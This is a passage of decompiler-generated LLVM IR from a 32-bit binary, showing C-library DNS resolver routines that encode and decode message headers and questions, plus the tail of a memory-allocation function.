  %v1_8067416 = icmp eq i32 %v0_8067416, 0
  %v1_8067418 = icmp eq i1 %v1_8067416, false
  br i1 %v1_8067418, label %dec_label_pc_8067479, label %dec_label_pc_806741a

dec_label_pc_806741a:                             ; preds = %dec_label_pc_8067416
  store i32 %tmp10, i32* @edx, align 4
  %v2_806741e = load i32, i32* %arg1, align 4
  store i32 %v2_806741e, i32* %eax.global-to-local, align 4
  %v9_8067420 = icmp eq i32 %v2_806741e, 1
  br i1 %v9_8067420, label %dec_label_pc_806742f, label %dec_label_pc_8067425

dec_label_pc_8067425:                             ; preds = %dec_label_pc_806741a
  %v9_8067425 = icmp eq i32 %v2_806741e, 2
  %v1_8067428 = icmp eq i1 %v9_8067425, false
  br i1 %v1_8067428, label %dec_label_pc_8067479, label %dec_label_pc_80674ca

dec_label_pc_806742f:                             ; preds = %dec_label_pc_806741a
  %v1_806742f = icmp eq i32 %v2_80673f4, 0
  br i1 %v1_806742f, label %dec_label_pc_80674ca, label %dec_label_pc_8067437

dec_label_pc_8067437:                             ; preds = %dec_label_pc_806742f
  %v4_806743e = mul i32 %v2_80673f4, %arg5
  store i32 %v4_806743e, i32* @esi, align 4
  %v2_8067442 = call i32 @malloc(i32 %v4_806743e)
  store i32 %v2_8067442, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v1_8067450 = icmp eq i32 %v2_8067442, 0
  store i32 %v2_8067442, i32* %v1_80673dd, align 4
  %v1_8067454 = icmp eq i1 %v1_8067450, false
  br i1 %v1_8067454, label %dec_label_pc_806746c, label %dec_label_pc_8067456

dec_label_pc_8067456:                             ; preds = %dec_label_pc_8067437
  store i32 0, i32* @esi, align 4
  %v0_806745a = load i32, i32* @global_var_80753f0, align 16
  %v3_8067465 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_806f184.800 to i32), i32 %v0_806745a)
  store i32 %v3_8067465, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80674c1

dec_label_pc_806746c:                             ; preds = %dec_label_pc_8067437
  %v0_806746d = load i32, i32* @esi, align 4
  %v0_8067470 = load i32, i32* @ebx, align 4
  %v5_8067470 = inttoptr i32 %v0_8067470 to i8*
  %v5_8067471 = call i32 @__GI_memset(i8* %v5_8067470, i32 0, i32 %v0_806746d)
  store i32 %v5_8067471, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067479

dec_label_pc_8067479:                             ; preds = %dec_label_pc_8067425, %dec_label_pc_8067416, %dec_label_pc_806746c
  store i32 0, i32* @ebp, align 4
  store i32 1, i32* @esi, align 4
  %v7_806749825 = icmp ne i32 %v2_80673f4, 0
  %v1_806749a30 = icmp eq i1 %v7_806749825, false
  br i1 %v1_806749a30, label %dec_label_pc_80674a0, label %dec_label_pc_806749c

dec_label_pc_8067482:                             ; preds = %dec_label_pc_806749c
  %v1_8067483 = add i32 %v0_806748332, 1
  store i32 %v1_8067483, i32* @ebp, align 4
  call void @__pseudo_call(i32 %arg5)
  %v0_806748f = load i32, i32* @ebx, align 4
  %v5_806748f = add i32 %v0_806748f, %arg4
  store i32 %v5_806748f, i32* @ebx, align 4
  %v0_8067496 = load i32, i32* %eax.global-to-local, align 4
  %v0_8067498.pre = load i32, i32* @ebp, align 4
  store i32 %v0_8067496, i32* @esi, align 4
  %v7_8067498 = icmp ult i32 %v0_8067498.pre, %v2_80673f4
  %v1_806749a = icmp eq i1 %v7_8067498, false
  br i1 %v1_806749a, label %dec_label_pc_80674a0, label %dec_label_pc_806749c

dec_label_pc_806749c:                             ; preds = %dec_label_pc_8067479, %dec_label_pc_8067482
  %v0_806749c33 = phi i32 [ %v0_8067496, %dec_label_pc_8067482 ], [ 1, %dec_label_pc_8067479 ]
  %v0_806748332 = phi i32 [ %v0_8067498.pre, %dec_label_pc_8067482 ], [ 0, %dec_label_pc_8067479 ]
  %v1_806749c = icmp eq i32 %v0_806749c33, 0
  %v1_806749e = icmp eq i1 %v1_806749c, false
  br i1 %v1_806749e, label %dec_label_pc_8067482, label %dec_label_pc_80674a0

dec_label_pc_80674a0:                             ; preds = %dec_label_pc_8067482, %dec_label_pc_806749c, %dec_label_pc_8067479
  %v0_806749c.lcssa = phi i32 [ 1, %dec_label_pc_8067479 ], [ %v0_806749c33, %dec_label_pc_806749c ], [ %v0_8067496, %dec_label_pc_8067482 ]
  %v2_80674a4 = load i32, i32* %arg1, align 4
  %v11_80674a4 = icmp eq i32 %v2_80674a4, 2
  %v1_80674a7 = icmp eq i1 %v11_80674a4, false
  br i1 %v1_80674a7, label %dec_label_pc_80674cf, label %dec_label_pc_80674a9

dec_label_pc_80674a9:                             ; preds = %dec_label_pc_80674a0
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80674b0 = load i32, i32* %v1_80673dd, align 4
  %v2_80674b2 = call i32 @free(i32 %v2_80674b0)
  store i32 %v2_80674b2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_80673dd, align 4
  br label %dec_label_pc_80674c1

dec_label_pc_80674c1:                             ; preds = %dec_label_pc_8067456, %dec_label_pc_80674a9
  %v0_80674d2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80674cf

dec_label_pc_80674c6:                             ; preds = %dec_label_pc_8067409, %entry
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80674cf

dec_label_pc_80674ca:                             ; preds = %dec_label_pc_8067425, %dec_label_pc_806742f
  store i32 1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80674cf

dec_label_pc_80674cf:                             ; preds = %dec_label_pc_80674a0, %dec_label_pc_80674c6, %dec_label_pc_80674c1, %dec_label_pc_80674ca
  %v0_80674d2 = phi i32 [ %v0_806749c.lcssa, %dec_label_pc_80674a0 ], [ 0, %dec_label_pc_80674c6 ], [ %v0_80674d2.pre, %dec_label_pc_80674c1 ], [ 1, %dec_label_pc_80674ca ]
  store i32 %v0_80674d2, i32* %eax.global-to-local, align 4
  store i32 %v0_80673d0, i32* %esi.global-to-local, align 4
  store i32 %v0_80673cf, i32* @edi, align 4
  store i32 %v0_80673ce, i32* @ebp, align 4
  ret i32 %v0_80674d2

; uselistorder directives
  uselistorder i32 %v0_80674d2, { 1, 0 }
  uselistorder i32 %v4_806743e, { 1, 0 }
  uselistorder i32 %v2_80673f4, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %v1_80673dd, { 1, 2, 0 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 9, 80, 78, 79, 82, 87, 85, 84, 13, 59, 10, 11, 12, 77, 61, 5, 6, 7, 8, 86, 83, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 73, 74, 75, 76, 1, 2, 3, 4, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 81 }
  uselistorder i64 4294967295, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32*, i32)* @xdr_u_long, { 18, 19, 20, 5, 16, 15, 17, 3, 0, 6, 7, 1, 8, 4, 12, 13, 14, 2, 9, 10, 11 }
  uselistorder i32 %arg5, { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80674cf, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80674ca, { 1, 0 }
  uselistorder label %dec_label_pc_80674c1, { 1, 0 }
  uselistorder label %dec_label_pc_80674a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806749c, { 1, 0 }
  uselistorder label %dec_label_pc_8067479, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8067416, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_3()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80674e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80674e0, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_80674ea = ptrtoint i8* %tmp to i32
  store i32 %v4_80674ea, i32* %esi.global-to-local, align 4
  %v7_80674ee = icmp sgt i32 %tmp9, 11
  br i1 %v7_80674ee, label %dec_label_pc_80674f4, label %dec_label_pc_8067588

dec_label_pc_80674f4:                             ; preds = %entry
  %v1_80674f4 = add i32 %tmp8, 1
  %v2_80674f4 = inttoptr i32 %v1_80674f4 to i8*
  %v3_80674f4 = load i8, i8* %v2_80674f4, align 1
  store i8 %v3_80674f4, i8* %tmp, align 1
  %v0_80674fa = load i32, i32* %ebx.global-to-local, align 4
  %v1_80674fa = inttoptr i32 %v0_80674fa to i32*
  %v2_80674fa = load i32, i32* %v1_80674fa, align 4
  %v1_80674fc = trunc i32 %v2_80674fa to i8
  %v2_80674fc = load i32, i32* %esi.global-to-local, align 4
  %v3_80674fc = add i32 %v2_80674fc, 1
  %v4_80674fc = inttoptr i32 %v3_80674fc to i8*
  store i8 %v1_80674fc, i8* %v4_80674fc, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_8067521 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067521 = add i32 %v0_8067521, 8
  %v2_8067521 = inttoptr i32 %v1_8067521 to i32*
  %v3_8067521 = load i32, i32* %v2_8067521, align 4
  %v1_8067524 = mul i32 %v3_8067521, 8
  %v2_8067527 = and i32 %v1_8067524, 120
  %v2_806752a = or i32 %v2_8067527, 4
  store i32 %v2_806752a, i32* %edx.global-to-local, align 4
  %v1_806752c = add i32 %v0_8067521, 20
  %v2_806752c = inttoptr i32 %v1_806752c to i32*
  %v3_806752c = load i32, i32* %v2_806752c, align 4
  %v4_806752c = icmp eq i32 %v3_806752c, 0
  %v1_8067530 = icmp eq i1 %v4_806752c, false
  %v2_8067530 = zext i1 %v1_8067530 to i32
  %v2_8067533 = or i32 %v2_8067530, %v2_806752a
  store i32 %v2_8067533, i32* %edx.global-to-local, align 4
  %v2_8067535 = or i32 %v2_8067533, 130
  %v3_8067535 = trunc i32 %v2_8067535 to i8
  store i32 %v2_8067535, i32* @ecx, align 4
  %v2_8067537 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067537 = add i32 %v2_8067537, 2
  %v4_8067537 = inttoptr i32 %v3_8067537 to i8*
  store i8 %v3_8067535, i8* %v4_8067537, align 1
  %v0_806753a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806753e = add i32 %v0_806753a, 28
  %v2_806753e = inttoptr i32 %v1_806753e to i8*
  %v3_806753e = load i8, i8* %v2_806753e, align 1
  %v5_806753e = load i32, i32* %edx.global-to-local, align 4
  %v2_8067547 = urem i8 %v3_806753e, 16
  %v7_8067547 = zext i8 %v2_8067547 to i32
  %v9_8067547 = and i32 %v5_806753e, -256
  %v10_8067547 = or i32 %v9_8067547, %v7_8067547
  store i32 %v10_8067547, i32* %edx.global-to-local, align 4
  %v2_806754a = or i8 %v2_8067547, -128
  %v2_806754c = load i32, i32* %esi.global-to-local, align 4
  %v3_806754c = add i32 %v2_806754c, 3
  %v4_806754c = inttoptr i32 %v3_806754c to i8*
  store i8 %v2_806754a, i8* %v4_806754c, align 1
  %v0_806754f = load i32, i32* %ebx.global-to-local, align 4
  %v1_806754f = add i32 %v0_806754f, 33
  %v2_806754f = inttoptr i32 %v1_806754f to i8*
  %v3_806754f = load i8, i8* %v2_806754f, align 1
  %v2_8067553 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067553 = add i32 %v2_8067553, 4
  %v4_8067553 = inttoptr i32 %v3_8067553 to i8*
  store i8 %v3_806754f, i8* %v4_8067553, align 1
  %v0_8067556 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067556 = add i32 %v0_8067556, 32
  %v2_8067556 = inttoptr i32 %v1_8067556 to i32*
  %v3_8067556 = load i32, i32* %v2_8067556, align 4
  %v1_8067559 = trunc i32 %v3_8067556 to i8
  %v2_8067559 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067559 = add i32 %v2_8067559, 5
  %v4_8067559 = inttoptr i32 %v3_8067559 to i8*
  store i8 %v1_8067559, i8* %v4_8067559, align 1
  %v0_806755c = load i32, i32* %ebx.global-to-local, align 4
  %v1_806755c = add i32 %v0_806755c, 37
  %v2_806755c = inttoptr i32 %v1_806755c to i8*
  %v3_806755c = load i8, i8* %v2_806755c, align 1
  %v2_8067560 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067560 = add i32 %v2_8067560, 6
  %v4_8067560 = inttoptr i32 %v3_8067560 to i8*
  store i8 %v3_806755c, i8* %v4_8067560, align 1
  %v0_8067563 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067563 = add i32 %v0_8067563, 36
  %v2_8067563 = inttoptr i32 %v1_8067563 to i32*
  %v3_8067563 = load i32, i32* %v2_8067563, align 4
  %v1_8067566 = trunc i32 %v3_8067563 to i8
  %v2_8067566 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067566 = add i32 %v2_8067566, 7
  %v4_8067566 = inttoptr i32 %v3_8067566 to i8*
  store i8 %v1_8067566, i8* %v4_8067566, align 1
  %v0_8067569 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067569 = add i32 %v0_8067569, 41
  %v2_8067569 = inttoptr i32 %v1_8067569 to i8*
  %v3_8067569 = load i8, i8* %v2_8067569, align 1
  %v2_806756d = load i32, i32* %esi.global-to-local, align 4
  %v3_806756d = add i32 %v2_806756d, 8
  %v4_806756d = inttoptr i32 %v3_806756d to i8*
  store i8 %v3_8067569, i8* %v4_806756d, align 1
  %v0_8067570 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067570 = add i32 %v0_8067570, 40
  %v2_8067570 = inttoptr i32 %v1_8067570 to i32*
  %v3_8067570 = load i32, i32* %v2_8067570, align 4
  %v1_8067573 = trunc i32 %v3_8067570 to i8
  %v2_8067573 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067573 = add i32 %v2_8067573, 9
  %v4_8067573 = inttoptr i32 %v3_8067573 to i8*
  store i8 %v1_8067573, i8* %v4_8067573, align 1
  %v0_8067576 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067576 = add i32 %v0_8067576, 45
  %v2_8067576 = inttoptr i32 %v1_8067576 to i8*
  %v3_8067576 = load i8, i8* %v2_8067576, align 1
  %v2_806757a = load i32, i32* %esi.global-to-local, align 4
  %v3_806757a = add i32 %v2_806757a, 10
  %v4_806757a = inttoptr i32 %v3_806757a to i8*
  store i8 %v3_8067576, i8* %v4_806757a, align 1
  %v0_806757d = load i32, i32* %ebx.global-to-local, align 4
  %v1_806757d = add i32 %v0_806757d, 44
  %v2_806757d = inttoptr i32 %v1_806757d to i32*
  %v3_806757d = load i32, i32* %v2_806757d, align 4
  %v1_8067580 = trunc i32 %v3_806757d to i8
  %v2_8067580 = load i32, i32* %esi.global-to-local, align 4
  %v3_8067580 = add i32 %v2_8067580, 11
  %v4_8067580 = inttoptr i32 %v3_8067580 to i8*
  store i8 %v1_8067580, i8* %v4_8067580, align 1
  %v2_8067588.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8067588

dec_label_pc_8067588:                             ; preds = %entry, %dec_label_pc_80674f4
  %v2_8067588 = phi i32 [ %v0_80674e0, %entry ], [ %v2_8067588.pre, %dec_label_pc_80674f4 ]
  %v0_806758a = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80674f4 ]
  store i32 %v2_8067588, i32* %ebx.global-to-local, align 4
  ret i32 %v0_806758a

; uselistorder directives
  uselistorder i32 45, { 8, 1, 3, 0, 6, 9, 4, 5, 7, 2 }
  uselistorder i32 41, { 3, 2, 1, 0 }
  uselistorder i32 37, { 4, 0, 2, 3, 5, 1 }
  uselistorder i32 33, { 7, 6, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8067588, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_806758c = load i32, i32* @ebx, align 4
  store i32 %v0_806758c, i32* %stack_var_-4, align 4
  %v4_806758d = ptrtoint i8* %tmp2 to i32
  store i32 %v4_806758d, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8067595 = load i8, i8* %tmp2, align 1
  %v3_8067595 = zext i8 %v2_8067595 to i32
  %v1_8067598 = add i32 %v4_806758d, 1
  %v2_8067598 = inttoptr i32 %v1_8067598 to i8*
  %v3_8067598 = load i8, i8* %v2_8067598, align 1
  %v4_8067598 = zext i8 %v3_8067598 to i32
  %v2_806759c = mul nuw nsw i32 %v3_8067595, 256
  %v2_806759f = or i32 %v4_8067598, %v2_806759c
  %v2_80675a1 = inttoptr i32 %tmp to i32*
  store i32 %v2_806759f, i32* %v2_80675a1, align 4
  %v0_80675a3 = load i32, i32* @ecx, align 4
  %v1_80675a3 = add i32 %v0_80675a3, 2
  %v2_80675a3 = inttoptr i32 %v1_80675a3 to i8*
  %v3_80675a3 = load i8, i8* %v2_80675a3, align 1
  %tmp6 = icmp slt i8 %v3_80675a3, 0
  %v2_80675a7 = zext i1 %tmp6 to i32
  %v1_80675aa = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675aa = add i32 %v1_80675aa, 4
  %v3_80675aa = inttoptr i32 %v2_80675aa to i32*
  store i32 %v2_80675a7, i32* %v3_80675aa, align 4
  %v0_80675ad = load i32, i32* @ecx, align 4
  %v1_80675ad = add i32 %v0_80675ad, 2
  %v2_80675ad = inttoptr i32 %v1_80675ad to i8*
  %v3_80675ad = load i8, i8* %v2_80675ad, align 1
  %v3_80675b0 = udiv i8 %v3_80675ad, 8
  %tmp7 = urem i8 %v3_80675b0, 16
  %v1_80675b3 = zext i8 %tmp7 to i32
  %v1_80675b6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675b6 = add i32 %v1_80675b6, 8
  %v3_80675b6 = inttoptr i32 %v2_80675b6 to i32*
  store i32 %v1_80675b3, i32* %v3_80675b6, align 4
  %v0_80675b9 = load i32, i32* @ecx, align 4
  %v1_80675b9 = add i32 %v0_80675b9, 2
  %v2_80675b9 = inttoptr i32 %v1_80675b9 to i8*
  %v3_80675b9 = load i8, i8* %v2_80675b9, align 1
  %div = udiv i8 %v3_80675b9, 4
  %tmp8 = urem i8 %div, 2
  %v1_80675c0 = zext i8 %tmp8 to i32
  %v1_80675c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675c3 = add i32 %v1_80675c3, 12
  %v3_80675c3 = inttoptr i32 %v2_80675c3 to i32*
  store i32 %v1_80675c0, i32* %v3_80675c3, align 4
  %v0_80675c6 = load i32, i32* @ecx, align 4
  %v1_80675c6 = add i32 %v0_80675c6, 2
  %v2_80675c6 = inttoptr i32 %v1_80675c6 to i8*
  %v3_80675c6 = load i8, i8* %v2_80675c6, align 1
  %div5 = udiv i8 %v3_80675c6, 2
  %tmp9 = urem i8 %div5, 2
  %v1_80675cc = zext i8 %tmp9 to i32
  %v1_80675cf = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675cf = add i32 %v1_80675cf, 16
  %v3_80675cf = inttoptr i32 %v2_80675cf to i32*
  store i32 %v1_80675cc, i32* %v3_80675cf, align 4
  %v0_80675d2 = load i32, i32* @ecx, align 4
  %v1_80675d2 = add i32 %v0_80675d2, 2
  %v2_80675d2 = inttoptr i32 %v1_80675d2 to i8*
  %v3_80675d2 = load i8, i8* %v2_80675d2, align 1
  %tmp10 = urem i8 %v3_80675d2, 2
  %v1_80675d6 = zext i8 %tmp10 to i32
  %v1_80675d9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675d9 = add i32 %v1_80675d9, 20
  %v3_80675d9 = inttoptr i32 %v2_80675d9 to i32*
  store i32 %v1_80675d6, i32* %v3_80675d9, align 4
  %v0_80675dc = load i32, i32* @ecx, align 4
  %v1_80675dc = add i32 %v0_80675dc, 3
  %v2_80675dc = inttoptr i32 %v1_80675dc to i8*
  %v3_80675dc = load i8, i8* %v2_80675dc, align 1
  %tmp11 = icmp slt i8 %v3_80675dc, 0
  %v2_80675e0 = zext i1 %tmp11 to i32
  %v1_80675e3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675e3 = add i32 %v1_80675e3, 24
  %v3_80675e3 = inttoptr i32 %v2_80675e3 to i32*
  store i32 %v2_80675e0, i32* %v3_80675e3, align 4
  %v0_80675e6 = load i32, i32* @ecx, align 4
  %v1_80675e6 = add i32 %v0_80675e6, 3
  %v2_80675e6 = inttoptr i32 %v1_80675e6 to i8*
  %v3_80675e6 = load i8, i8* %v2_80675e6, align 1
  %tmp12 = urem i8 %v3_80675e6, 16
  %v1_80675ea = zext i8 %tmp12 to i32
  %v1_80675ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675ed = add i32 %v1_80675ed, 28
  %v3_80675ed = inttoptr i32 %v2_80675ed to i32*
  store i32 %v1_80675ea, i32* %v3_80675ed, align 4
  %v0_80675f0 = load i32, i32* @ecx, align 4
  %v1_80675f0 = add i32 %v0_80675f0, 4
  %v2_80675f0 = inttoptr i32 %v1_80675f0 to i8*
  %v3_80675f0 = load i8, i8* %v2_80675f0, align 1
  %v4_80675f0 = zext i8 %v3_80675f0 to i32
  %v1_80675f4 = add i32 %v0_80675f0, 5
  %v2_80675f4 = inttoptr i32 %v1_80675f4 to i8*
  %v3_80675f4 = load i8, i8* %v2_80675f4, align 1
  %v4_80675f4 = zext i8 %v3_80675f4 to i32
  %v2_80675f8 = mul nuw nsw i32 %v4_80675f0, 256
  %v2_80675fb = or i32 %v4_80675f4, %v2_80675f8
  %v1_80675fd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675fd = add i32 %v1_80675fd, 32
  %v3_80675fd = inttoptr i32 %v2_80675fd to i32*
  store i32 %v2_80675fb, i32* %v3_80675fd, align 4
  %v0_8067600 = load i32, i32* @ecx, align 4
  %v1_8067600 = add i32 %v0_8067600, 6
  %v2_8067600 = inttoptr i32 %v1_8067600 to i8*
  %v3_8067600 = load i8, i8* %v2_8067600, align 1
  %v4_8067600 = zext i8 %v3_8067600 to i32
  %v1_8067604 = add i32 %v0_8067600, 7
  %v2_8067604 = inttoptr i32 %v1_8067604 to i8*
  %v3_8067604 = load i8, i8* %v2_8067604, align 1
  %v4_8067604 = zext i8 %v3_8067604 to i32
  %v2_8067608 = mul nuw nsw i32 %v4_8067600, 256
  %v2_806760b = or i32 %v4_8067604, %v2_8067608
  %v1_806760d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806760d = add i32 %v1_806760d, 36
  %v3_806760d = inttoptr i32 %v2_806760d to i32*
  store i32 %v2_806760b, i32* %v3_806760d, align 4
  %v0_8067610 = load i32, i32* @ecx, align 4
  %v1_8067610 = add i32 %v0_8067610, 8
  %v2_8067610 = inttoptr i32 %v1_8067610 to i8*
  %v3_8067610 = load i8, i8* %v2_8067610, align 1
  %v4_8067610 = zext i8 %v3_8067610 to i32
  %v1_8067614 = add i32 %v0_8067610, 9
  %v2_8067614 = inttoptr i32 %v1_8067614 to i8*
  %v3_8067614 = load i8, i8* %v2_8067614, align 1
  %v4_8067614 = zext i8 %v3_8067614 to i32
  %v2_8067618 = mul nuw nsw i32 %v4_8067610, 256
  %v2_806761b = or i32 %v4_8067614, %v2_8067618
  %v1_806761d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806761d = add i32 %v1_806761d, 40
  %v3_806761d = inttoptr i32 %v2_806761d to i32*
  store i32 %v2_806761b, i32* %v3_806761d, align 4
  %v0_8067620 = load i32, i32* @ecx, align 4
  %v1_8067620 = add i32 %v0_8067620, 10
  %v2_8067620 = inttoptr i32 %v1_8067620 to i8*
  %v3_8067620 = load i8, i8* %v2_8067620, align 1
  %v4_8067620 = zext i8 %v3_8067620 to i32
  %v1_8067624 = add i32 %v0_8067620, 11
  %v2_8067624 = inttoptr i32 %v1_8067624 to i8*
  %v3_8067624 = load i8, i8* %v2_8067624, align 1
  %v4_8067624 = zext i8 %v3_8067624 to i32
  %v2_8067628 = mul nuw nsw i32 %v4_8067620, 256
  %v2_806762b = or i32 %v4_8067624, %v2_8067628
  %v1_806762d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806762d = add i32 %v1_806762d, 44
  %v3_806762d = inttoptr i32 %v2_806762d to i32*
  store i32 %v2_806762b, i32* %v3_806762d, align 4
  %v2_8067635 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8067635, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 40, { 25, 26, 30, 14, 32, 28, 29, 17, 18, 19, 20, 21, 15, 31, 8, 9, 27, 7, 24, 1, 2, 33, 34, 35, 36, 16, 22, 3, 0, 10, 11, 12, 13, 23, 4, 6, 5 }
  uselistorder i32 28, { 74, 75, 92, 76, 94, 103, 104, 105, 84, 77, 78, 0, 79, 80, 81, 82, 83, 4, 5, 6, 2, 50, 51, 52, 53, 54, 55, 7, 43, 44, 45, 93, 32, 33, 95, 31, 106, 62, 1, 14, 56, 57, 73, 46, 47, 18, 19, 8, 9, 85, 86, 87, 88, 89, 96, 97, 98, 99, 100, 101, 3, 102, 109, 90, 58, 110, 111, 114, 115, 112, 113, 107, 108, 59, 60, 61, 63, 64, 34, 35, 20, 36, 37, 38, 65, 66, 48, 49, 10, 67, 12, 68, 11, 69, 39, 40, 41, 42, 70, 71, 21, 22, 72, 15, 23, 24, 25, 26, 27, 28, 29, 30, 17, 16, 13, 91 }
  uselistorder i8 2, { 2, 3, 4, 5, 9, 10, 11, 41, 12, 0, 44, 45, 13, 14, 15, 16, 17, 42, 43, 18, 30, 19, 20, 6, 31, 32, 21, 22, 33, 34, 23, 24, 25, 7, 8, 26, 29, 35, 27, 36, 28, 37, 38, 39, 1, 40 }
  uselistorder i8 4, { 0, 6, 7, 2, 8, 1, 3, 4, 5 }
  uselistorder i8 16, { 0, 1, 4, 10, 11, 2, 6, 3, 12, 7, 8, 5, 9 }
  uselistorder i8 8, { 0, 2, 9, 8, 7, 10, 11, 12, 1, 3, 4, 5, 6 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8067638 = load i32, i32* @edi, align 4
  %v0_8067639 = load i32, i32* @esi, align 4
  %v0_806763a = load i32, i32* @ebx, align 4
  store i32 %v0_806763a, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_8067647 = load i32, i32* @eax, align 4
  %v1_806764a = inttoptr i32 %tmp to i32*
  %v2_806764a = load i32, i32* %v1_806764a, align 4
  %v7_806764c = inttoptr i32 %v2_806764a to i8*
  %v8_806764c = call i32 @__encode_dotted(i8* %v7_806764c, i32 %tmp2, i32 %tmp3, i32 %v0_8067647, i32 %v0_806763a, i32 %v0_8067639, i32 %v0_8067638)
  %v2_8067654 = icmp slt i32 %v8_806764c, 0
  store i32 %v8_806764c, i32* @ecx, align 4
  br i1 %v2_8067654, label %dec_label_pc_8067685, label %dec_label_pc_806765a

dec_label_pc_806765a:                             ; preds = %entry
  %v0_806765a = load i32, i32* @ebx, align 4
  %v2_806765a = sub i32 %v0_806765a, %v8_806764c
  %v1_806765c = add i32 %v2_806765a, -3
  %v6_806765c = sub i32 2, %v2_806765a
  %v7_806765c = and i32 %v6_806765c, %v2_806765a
  %v8_806765c = icmp slt i32 %v7_806765c, 0
  %v9_806765c = icmp eq i32 %v1_806765c, 0
  %v10_806765c = icmp slt i32 %v1_806765c, 0
  %v3_806765f = icmp eq i1 %v10_806765c, %v8_806765c
  %v4_806765f = icmp eq i1 %v9_806765c, false
  %v5_806765f = and i1 %v4_806765f, %v3_806765f
  br i1 %v5_806765f, label %dec_label_pc_8067666, label %dec_label_pc_8067661

dec_label_pc_8067661:                             ; preds = %dec_label_pc_806765a
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8067685

dec_label_pc_8067666:                             ; preds = %dec_label_pc_806765a
  %v0_8067666 = load i32, i32* @edi, align 4
  %v2_8067666 = add i32 %v0_8067666, %v8_806764c
  store i32 %v2_8067666, i32* @edx, align 4
  %v0_8067669 = load i32, i32* @esi, align 4
  %v1_8067669 = add i32 %v0_8067669, 5
  %v2_8067669 = inttoptr i32 %v1_8067669 to i8*
  %v3_8067669 = load i8, i8* %v2_8067669, align 1
  %v1_806766d = add i32 %v8_806764c, 4
  store i32 %v1_806766d, i32* @ecx, align 4
  %v3_8067670 = inttoptr i32 %v2_8067666 to i8*
  store i8 %v3_8067669, i8* %v3_8067670, align 1
  %v0_8067672 = load i32, i32* @esi, align 4
  %v1_8067672 = add i32 %v0_8067672, 4
  %v2_8067672 = inttoptr i32 %v1_8067672 to i32*
  %v3_8067672 = load i32, i32* %v2_8067672, align 4
  %v1_8067675 = trunc i32 %v3_8067672 to i8
  %v2_8067675 = load i32, i32* @edx, align 4
